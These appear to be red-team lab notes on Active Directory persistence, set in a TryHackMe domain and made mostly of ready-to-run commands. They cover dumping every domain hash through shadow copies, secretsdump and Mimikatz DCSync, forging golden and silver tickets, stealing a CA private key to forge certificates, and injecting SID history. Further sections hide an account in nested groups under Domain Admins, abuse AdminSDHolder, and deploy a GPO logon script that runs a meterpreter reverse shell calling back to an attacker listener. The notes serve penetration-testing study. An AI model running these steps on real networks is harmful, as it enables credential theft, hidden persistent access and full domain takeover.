# Persistence

DCSync to get all hashes and maybe target other DCs if they exist.

## Shadow Copies

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.

{% code overflow="wrap" fullWidth="true" %}
```csharp
https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample
# The attack needs Domain Admin and be launched from an elevated prompt
vshadow.exe -nw -p C: # take note of the shadow copy device name
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak # copy the whole AD Database shadow copy to C:
reg.exe save hklm\system c:\system.bak # to correctly extract ntds.dit, we need to save the SYSTEM hive
secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
# Another (stealthier) way is to move laterally to the DC and run Mimikat to dump every hash using DCSync
```
{% endcode %}

You should not wait until the full domain compromise to deploy persistence. After each round of lateral movement and privilege escalation, persistence should be deployed.

## Credentials

{% code overflow="wrap" fullWidth="true" %}
```powershell
The goal then is to persist with near-privileged credentials. We don't always need the full keys to the kingdom; we just need enough keys to ensure we can still achieve goal execution and always make the blue team look over their shoulder. As such, we should attempt to persist through credentials such as the following:

    Credentials that have local administrator rights on several machines. Usually, organisations have a group or two with local admin rights on almost all computers. These groups are typically divided into one for workstations and one for servers. By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.
    Service accounts that have delegation permissions. With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
    Accounts used for privileged AD services. If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.
    
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
# This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz:
mimikatz # log <myusername>_dcdump.txt 
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
cat <username>_dcdump.txt | grep "SAM Username"
```
{% endcode %}

## Domain User

```csharp
net user $USER $PASS /add /domain
```

## Tickets

### Golden Tickets

```c
mimikatz# kerberos::ptt golden_ticket
mimikatz# misc::cmd
# Then try on that new cmd prompt
PsExec64.exe \\dc01 cmd.exe
```

* By injecting at this stage of the Kerberos process, we don't need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
* Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
* Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence.
* By default, the KRBTGT account's password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever.
* The blue team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
* Rotating the KRBTGT account's password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
* Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
* We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect.

### Silver Tickets

{% code overflow="wrap" fullWidth="true" %}
```bash
# we need NTLM hash of the current account and domain SID
# NT hash of the pwd -> on Python
import hashlib 
hashlib.new('md4', 'password'.encode('utf-16le')).digest().hex()
# Domain-SID using get-domainsid or similar
ticketer.py -nthash $NT_HASH -domain-sid $DOMAIN_SID -domain domain.local -spn example/dc.domain.local administrator
KRB5CCNAME=administrator.ccache psexec/smbexec/mssqlclient.py -k administrator@dc.domain.local
```
{% endcode %}

* The generated TGS is signed by the machine account of the host we are targeting.
* The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server.
* Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
* Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.
* The machine account's password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.
* While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Golden Ticket -> /Administrator is the user to impersonate (CANNOT be faked), /domain the FQDN
mimikatz # kerberos::golden /Administrator:Mypass123! /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
# Confirm the ticket is working by running dir against the DC
dir \\thmdc.za.tryhackme.loc\c$\

# Silver Ticket -> /rc4 is NTLM hash of machine (MACHINE01$) /target is the target server has the format host.sub.domain.com, /service can be CIFS since it allows file access
mimikatz # kerberos::golden /Administrator:Mypass123! /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
# Confirm the ticket is working by running dir against that specific host/machine
dir \\thmserver1.za.tryhackme.loc\c$\
```
{% endcode %}

NOTE: **The techniques discussed from this point forward are incredibly invasive and hard to remove. Even if you have signoff on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them.**

## Certificates

{% code overflow="wrap" fullWidth="true" %}
```powershell
# We could simply steal the private key of the root CA's certificate to generate our own certificates and since CA never issued them, blue team cannot revoke them.
https://pentestlab.blog/2021/11/15/golden-certificate/
# Extracting the CA Private Key -> if the private key is not protected through hardware-based protection methods
# First we see the certificates stored on the DC:
mimikatz # crypto::certificates /systemstore:local_machine
# We should find a CA certificate on the DC. Now with Mimikatz we patch memory to make these keys exportable
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
# With these services patched, we export the certificate
mimikatz # crypto::certificates /systemstore:local_machine /export
# We should have a file named XXX-CA.pfx -> mimikatz export it with a default password "mimikatz"

# Generating our own Certificates -> with .pfx file previously exported
https://github.com/GhostPack/ForgeCert
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
# Subject does not really matter, SubjectAltName is the User Principal Name (UPN) of the account we want to impersonate (it has to be a legitimate user.)
# Now with Rubeus we request a TGT using the certificate to verify that the certificate is trusted
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<CERT_FILE> /password:<CERT_PASS> /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:<DC_IP>
# Then we load the TGT and authenticate to DC:
mimikatz # kerberos::ptt administrator.kirbi
dir \\DC.sub.domain.com\c$\
```
{% endcode %}

## SID History

SID history is useful for migrations when we want to keep using an account with the original domain that will be cloned.

* We normally require Domain Admin privileges or the equivalent thereof to perform this attack.
* When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
* We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
* Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Forging History -> first make sure our low-privileged user does not have any SIDHistory
Get-ADUser <your ad username> -properties sidhistory,memberof
# Get SID of the group we want to add to our SID History
Get-ADGroup "Domain Admins"
https://github.com/MichaelGrafnetter/DSInternals
# Use DSInternals to add SID history and directly patch the ntds.dit file, the AD database where all information is stored
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-privileged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
PS C:\Users\Administrator.ZA>Start-Service -Name ntds  
# Now log in as the low-privileged user and check SIDHistory exists:
PS C:\> Get-ADUser <LOW-PRIV USER> -Properties sidhistory 
dir \\dc.sub.domain.com\c$
# SIDHistory attribute is protected. To remove it, you need tools such as the AD-RSAT PowerShell cmdlets.
```
{% endcode %}

## Group Membership

Any group that classifies as a protected group, such as Domain Admins or Enterprise Admins, receive additional security scrutiny. So if we want to persist through group membership, we may need to get creative regarding the groups we add our own accounts to for persistence:

* The IT Support group can be used to gain privileges such as force changing user passwords. Although, in most cases, we won't be able to reset the passwords of privileged users, having the ability to reset even low-privileged users can allow us to spread to workstations.
* Groups that provide local administrator rights are often not monitored as closely as protected groups. With local administrator rights to the correct hosts through group membership of a network support group, we may have good persistence that can be used to compromise the domain again.
* It is not always about direct privileges. Sometimes groups with indirect privileges, such as ownership over Group Policy Objects (GPOs), can be just as good for persistence.

Rather than adding ourselves to a privileged group that would raise an alert, we add ourselves to a subgroup that is not being monitored.

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Nesting Our Persistence -> start by creating a new base group that we will hide in the People->IT Organisational Unit (OU)
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
# Let's now create another group in the People->Sales OU and add our previous group as a member
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
# We can do this a couple more times, every time adding the previous group as a member
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
# With the last group, let's now add that group to the Domain Admins group
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
# Lastly, let's add our low-privileged AD user to the first group we created
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
# Instantly, your low-privileged user should now have privileged access to DC
dir \\thmdc.za.tryhackme.loc\c$\
# Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member
PS C:\Users\Administrator.ZA> Get-ADGroupMember -Identity "Domain Admins"
# If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. However, this is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organisation's AD structure
```
{% endcode %}

## ACLs

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)
# Persisting with AdminSDHolder
runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe # from low-priv shell to not use Administrator RDP and log actual user out
Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System
Navigate to the Security of the group (Right-click->Properties->Security)
Add our low-privileged user and grant Full Control:
    Click Add.
    Search for your low-privileged username and click Check Names.
    Click OK.
    Click Allow on Full Control.
    Click Apply.
    Click OK.
    
# SDProp -> instead of waiting 60 min, invoke the process manually
PS C:\Tools> Import-Module .\Invoke-ADSDPropagation.ps1 
PS C:\Tools> Invoke-ADSDPropagation
# Once done, give it a minute and then review the security permissions of a Protected Group such as the Domain Admins group to see our low-priv user with full control over that group
# With Full Control we could add our low-priv user to the Domain Admins group for example
```
{% endcode %}

## GPOs

The following are some common GPO persistence techniques:

* Restricted Group Membership - This could allow us administrative access to all hosts in the domain
* Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Preparation
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
# Create a <username>_script.bat with a line executing the .exe and upload both to the DC machine
# Then start MSF listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"

# GPO Creation -> use Domain Admin account to open the Group Policy Management (runas /credonly domain\Administrator or so)
    In your runas-spawned terminal, type MMC and press enter.
    Click on File->Add/Remove Snap-in...
    Select the Group Policy Management snap-in and click Add
    Click OK
Below the Default Domain Policy, right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO
Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. Now you can right-click on your policy and select edit:
Get back to our Group Policy Management Editor:
    Under User Configuration, expand Policies->Windows Settings.
    Select Scripts (Logon/Logoff).
    Right-click on Logon->Properties
    Select the Scripts tab.
    Click Add->Browse.
Select the script and Apply and OK. This will now ensure that every time one of the administrators logs into any machine, we will get a callback. 
# If we need to simulate, reset pwd of any of the Admins and authenticate again. To create a Logon event you need to sign out and then RDPin.

# Hiding in Plain Sight
Go back to your MMC windows, click on your policy and then click on Delegation
By default, all administrators have the ability to edit GPOs. Let's remove these permissions:
    Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
    Click on all other groups (except Authenticated Users) and click Remove.
Click on Advanced and remove the Created Owner from the permissions:
```
{% endcode %}

## Additional Persistence Techniques

[**Skeleton keys**](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/)

[**Directory Service Restore Mode (DSRM)**](https://adsecurity.org/?p=1714)

[**Malicious Security Support Provider (SSP)**](https://adsecurity.org/?p=1760)

[**Computer Accounts**](https://adsecurity.org/?p=2753)

## Mitigations

* Anomalous account logon events are the most common alert for persistence. Any time credentials break the tiering model, it can be as a result of persistence.
* For each of the persistence techniques mentioned, specific detection rules can be written, such as cases when a machine account's password changes, ACLs are permissively updated, or new GPOs are created.
* The best defence against persistence is to protect privileged resources. Although low privileged access can be used to deploy persistence, the truly scary techniques only become available once an attacker has acquired privileged access to the domain.
